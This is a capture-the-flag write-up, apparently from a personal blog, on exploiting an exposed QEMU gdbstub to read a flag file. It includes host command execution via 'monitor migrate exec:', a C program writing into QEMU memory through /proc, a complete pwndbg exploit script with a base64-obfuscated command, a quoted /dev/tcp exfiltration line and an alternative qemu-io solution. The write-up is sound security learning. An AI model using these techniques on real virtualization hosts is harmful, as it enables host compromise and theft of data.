---
title: leaking flag via qemu gdbstub
categories:
  - research
  - ctf
tags:
  - pwn
  - qemu
pin: true
image:
  path: /assets/img/qsecurebyrejection.PNG
  alt: qemu
published: true
---

## intro

![qsecurebyrejection](https://n1kkogg.github.io/assets/img/qsecurebyrejectionjctf.png)

In this challenge, we are given Docker container that launches an Alpine Linux VM under QEMU with debugging enabled. The vm starts paused, exposes a GDB server (on port 1234) and also comes bundled with pwndbg. The flag is as always palced on /flag.txt, which means that we somehow have to get arbitrary read.

```Dockerfile
FROM ubuntu:25.04

RUN apt update && DEBIAN_FRONTEND=noninteractive apt install -y wget qemu-system-x86
RUN wget -O alpine.iso https://dl-cdn.alpinelinux.org/alpine/v3.21/releases/x86_64/alpine-standard-3.21.3-x86_64.iso
RUN apt-get install curl -y
RUN apt-get install xz-utils -y
RUN curl -qsL 'https://install.pwndbg.re' | sh -s -- -t pwndbg-gdb 
EXPOSE 1234/tcp
COPY ./flag.txt /flag.txt
CMD qemu-system-x86_64 \
    -machine pc \
    -m 386 \
    -smp 1 \
    -cdrom alpine.iso \
    -nographic \
    -monitor none \
    -s -S
```

`-monitor none`

This option disables QEMU’s interactive monitor console (you can usually open with `Ctrl + Alt + 2`), preventing control of the VM backend from the terminal. The virtual machine runs fully headless with no user‑accessible QEMU shell.

This does **not** disable QEMU’s internal monitor on gdbstub. When used with `-s` , all monitor commands are still accessible through GDB using the `monitor` command.

additionally, the remote docker vm **cannot access the internet**, which means we cant just leak the flag via curl or tcp. We somehow have to leak the flag and receive it from GDB.

## some initial analysis and ideas

One of the less‑known monitor commands is `migrate`. Migration is designed to stream a VM’s state to another destination, and QEMU supports several migration backends. Among them is a special backend that spawns a host‑side process and pipes the migration stream into it... which is a bit questionable security-wise.

example: `monitor migrate "exec: sleep 10"`
we can see a new process gets spawned:

```bash
root           7  0.0  0.5 1764000 46592 pts/0   Sl+  23:08   0:00 qemu-system-x86_64 -machine pc -m 386
root         651  0.0  0.0   2888  1248 pts/0    S+   23:31   0:00  \_ /bin/sh -c  sleep 10
root         653  0.0  0.0   2764  1172 pts/0    S+   23:31   0:00      \_ sleep 10
```

While this provided Arbitrary Command Execution, unfortunately due to the strict costraints of the environment, I couldn't execute a simple `cat /flag.txt > /dev/tcp/myip/myport` because as we stated before VM ran inside an isolated container with no outbound network access, ruling out obvious exfil methods such as TCP/UDP connetions.

## socket fd hijacking?

An early idea was to bypass the guest entirely and write directly to the GDB stub’s socket. Since the debugger connection is just a TCP socket inside the QEMU process, the plan was straightforward:

1. connect to gdbstub via nc and wait for output `nc 127.0.0.1 1234`
2. check if a socket fd was created /proc/qemupid/fd/
```bash
root@96cd8fe1915f:/proc/7/fd# ls -la
total 0
dr-x------ 2 root root  0 Jan 18 23:08 .
dr-xr-xr-x 9 root root  0 Jan 18 23:08 ..
lrwx------ 1 root root 64 Jan 18 23:08 0 -> /dev/pts/0
lrwx------ 1 root root 64 Jan 18 23:08 1 -> /dev/pts/0
lrwx------ 1 root root 64 Jan 18 23:08 10 -> '/memfd:displaysurface (deleted)'
lrwx------ 1 root root 64 Jan 18 23:08 11 -> 'socket:[207743]'
lrwx------ 1 root root 64 Jan 18 23:08 12 -> 'socket:[207744]'
lrwx------ 1 root root 64 Jan 18 23:08 13 -> 'socket:[217736]' # SOCKET CREATED!
lrwx------ 1 root root 64 Jan 18 23:08 2 -> /dev/pts/0
lrwx------ 1 root root 64 Jan 18 23:08 3 -> 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Jan 18 23:08 4 -> 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Jan 18 23:08 5 -> 'anon_inode:[signalfd]'
lrwx------ 1 root root 64 Jan 18 23:08 6 -> 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Jan 18 23:08 7 -> 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Jan 18 23:08 8 -> 'anon_inode:[eventfd]'
lr-x------ 1 root root 64 Jan 18 23:08 9 -> /alpine.iso
```
3. Use `ptrace()` to invoke a `write()` syscall on that file descriptor, sending the flag directly over the debugger connection.


The socket file descriptor appeared as expected in /proc, and ptrace() successfully invoked write() on it. From the kernel’s perspective, the bytes were delivered to the socket without error.

**However, nothing was ever displayed on the GDB side.**

## side channel?

Another idea was to intentionally crash or destabilize the gdbstub (lag or delay the packets) based on an oracle condition (e.g., correct vs. incorrect guess). This was abandoned for several reasons:

- Crash is timing‑dependent and unreliable

- This side channel would take ages to run

- We don't know the lenght of the flag, making this approach impractical

- A cleaner and deterministic channel exists

# The breaktrough

The breakthrough came from completely reframing the problem. Instead of trying to push arbitrary bytes through the GDB socket, QEMU itself was treated as the transport mechanism.

At first, the idea was straightforward: open QEMU’s memory (`/proc/<pid>/mem`), locate a suitable region, and write() the flag there. Since we already have host‑side code execution via the monitor, arbitrary memory access is not the hard part.

The real question is **where can we actually write the flag in a way that we can also read it via qemu gdbstub original features**

Blindly writing into QEMU’s heap or stack achieves nothing unless that data is later transmitted over a channel we control.

## a reliable output channel

During normal GDB attachment, the Remote Serial Protocol includes qXfer read requests such as:

`qXfer:features:read:target.xml:0,400`

These requests are issued unconditionally by GDB as part of protocol negotiation. QEMU handles them by copying an internal, in‑memory buffer containing the target XML description and sending it directly over the gdbstub socket.

*This is exactly what we need*

It is:

- resident in QEMU’s address space,

- read and transmitted on demand,

- and returned to the debugger without modification.

*Overwriting this buffer turns qXfer into a read primitive :). Triggering the request causes QEMU to send the flag back over the GDB connection.*

`maintenance packet qXfer:features:read:target.xml:0,400`

jackpot!!!

![qsecurebyrejection_maintenancepacket](https://n1kkogg.github.io/assets/img/qsecurebydesign_maintenancepacket.PNG)


## locating target.xml

To exploit this, the next step was to find where QEMU stores the target.xml buffer in memory.

By attaching GDB directly to the QEMU process and searching for the XML contents, I was able to identify a static offset relative to the heap. The heap base itself is fairly easy to obtain via:

`/proc/<qemu-pid>/maps`

e.g:

```bash
root@96cd8fe1915f:/proc/7# cat maps | grep heap
55a61f57d000-55a620805000 rw-p 00000000 00:00 0                          [heap]
```

so we know that the heap base is: `0x55a61f57d000`

Once both are known, the exact address backing `qXfer:features:read` responses becomes predictable.

![qsecurebyrejection_heap](https://n1kkogg.github.io/assets/img/qsecurebyrejection_heap.png)

From there, we can start building our POC:

```c
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int c, char** argv){
	int fd = open("/proc/7/mem", O_RDWR);
	unsigned long theaddr = strtoul(argv[1], NULL, 0) + 0x820960;
	lseek(fd, theaddr, SEEK_SET);
	write(fd, argv[2], strlen(argv[2]));
	close(fd);
	return 0;
}
```

## problem: how do we transfer the compiled binary?

With memory corruption solved, the remaining problem is surprisingly "simple":
**how do we get our helper binary onto the host filesystem in the first place?**

We can't directly upload our binary, but we do have a powerful primitive that we can leverage:
`ACE on host via QEMU monitor`

As i stated before, the monitor migration backend accepts `exec:` which execute any command on the host machine.

The approach is pretty simple:

1. b64 encode the helper binary
2. split it in small chunks to avoid command lenght limits
3. append every chunk in a temp file
4. decode it back and mark as executable
5. execute it with the runtime arguments. For this we can use bash substitution $() 

the first arg will have this command which reads the heap base:

```bash
echo -n "0x"; awk '/\[heap\]/ { split($1, a, "-"); print a[1] }' /proc/7/maps
```

and the second will just read the flag:

```bash
$(cat /flag.txt)
```


## The solution

Finally here's my solution: (run with `pwndbg --command=./exploit.py -ex 'py pwn()'`)

1. attach to the QEMU gdbstub
2. prepare payload, and split in segments
3. use echo to merge every segment in one large text file
4. decode and mark as executable
5. run the binary with these arguments: `/tmp/solve $(echo \'ZWNobyAtbiAiMHgiOyBhd2sgJy9cW2hlYXBcXS8geyBzcGxpdCgkMSwgYSwgIi0iKTsgcHJpbnQgYVsxXSB9JyAvcHJvYy83L21hcHM=\'|base64 -d|bash) $(cat /flag.txt)`
6. finally use maintenance to read the flag `maintenance packet qXfer:features:read:target.xml:0,400`

```python
import pwndbg.dbg
import pwndbg.aglib.memory
import pwndbg.aglib.vmmap
import pwndbg.lib.cache
import time
import gdb
import os
from pwn import info
import base64


def _delayed_interrupt(timeout_seconds):
    time.sleep(timeout_seconds)
    gdb.execute('interrupt')

def cont_interrupt_after(timeout_seconds):
    gdb.post_event(lambda: _delayed_interrupt(timeout_seconds))
    gdb.execute('continue')

def pwn():
    pwndbg.lib.cache.IS_CACHING = False

    gdb.execute('target remote 127.0.0.1:1234')

    # solve file is the compiled version of solve.c (gcc -s solve.c -o solve)
    with open("solve", "rb") as f:
        payload = base64.b64encode(f.read()).decode()

    chunks = [payload[i:i+900] for i in range(0, len(payload), 900)]
    len

    cont_interrupt_after(30)

    a = 0
    for i in chunks:
        a += 1
        info(f"loading exploit... [{a}/{len(chunks)}]")
        gdb.execute(f'monitor migrate "exec: echo -n \'{i}\' >> /tmp/payload"')
        cont_interrupt_after(1)
    info("decoding exploit and changing permissions...")
    gdb.execute('monitor migrate "exec: base64 -d /tmp/payload > /tmp/solve;chmod +x /tmp/solve"')
    cont_interrupt_after(1)
    info("executing payload with base address of heap and the flag...") # echo -n "0x"; awk '/\[heap\]/ { split($1, a, "-"); print a[1] }' /proc/7/maps
    gdb.execute('monitor migrate "exec: /tmp/solve $(echo \'ZWNobyAtbiAiMHgiOyBhd2sgJy9cW2hlYXBcXS8geyBzcGxpdCgkMSwgYSwgIi0iKTsgcHJpbnQgYVsxXSB9JyAvcHJvYy83L21hcHM=\'|base64 -d|bash) $(cat /flag.txt)"')
    cont_interrupt_after(1)
    info("calling the maintenance packet :D")
    gdb.execute('maintenance packet qXfer:features:read:target.xml:0,400')


    # Example usage for printing vmmap
    pages = pwndbg.aglib.vmmap.get()
    print(pages)

    # Example usage for reading memory
    print(pwndbg.aglib.memory.read(pages[0].start, 0x1000))

    os._exit(0)

# How to run:
# pwndbg --command=./exploit.py -ex 'py pwn()'
```

![qsecurebyrejection_flag](https://n1kkogg.github.io/assets/img/qsecurebyrejection_flag.png)

## looking back + the intended solution

In hindsight, the intended solution was both simpler and more elegant.

Rather than abusing migration backends or reconstructing binaries on the host, the challenge was designed around QEMU’s block‑device tooling. By using the `qemu-io` monitor command, it is possible to directly write arbitrary data into the emulated CD‑ROM image. Since the bootloader later maps this data into memory, the flag naturally becomes readable from guest memory.

Here's a nice solution from Friendly Maltese Citizens:

```py
import gdb
from subprocess import run

gdb.execute("monitor qemu-io ide1-cd0 \"reopen -w\"")
gdb.execute("monitor qemu-io ide1-cd0 \"write -s flag.txt 0x1c100 256\"")
gdb.execute("b *0x7c00")
gdb.execute("c")
gdb.execute("p (char *)0x7d00")
```

Looking back, my mistake was over-focusing on `monitor migrate`. Usually large virtualization apps like qemu expose a larger attack surface like `qemu-io` in this case.

Overall GREAT challenge, pushed me to dig deep in the QEMU monitor and I definetly came out with a MUCH better mental model of qemu internals.


thank you for reading!!! <3